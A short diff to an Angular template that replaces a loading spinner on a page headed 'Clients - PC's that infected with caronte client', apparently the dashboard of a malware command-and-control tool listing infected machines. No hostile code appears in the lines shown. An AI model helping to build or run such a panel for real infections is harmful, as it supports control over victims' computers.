@@ -1,6 +1,5 @@
 <h2 class="text-center text-white">Clients - PC's that infected with caronte client</h2>
-
-<mat-spinner *ngIf="clients.length == 0"></mat-spinner>
+<custom-spinner [spin]="Spin()"></custom-spinner>
 <table mat-table [dataSource]="clients" class="bg-cream" *ngIf="clients.length > 0">
   <ng-container matColumnDef="clientId">
     <th mat-header-cell *matHeaderCellDef> Client ID </th>
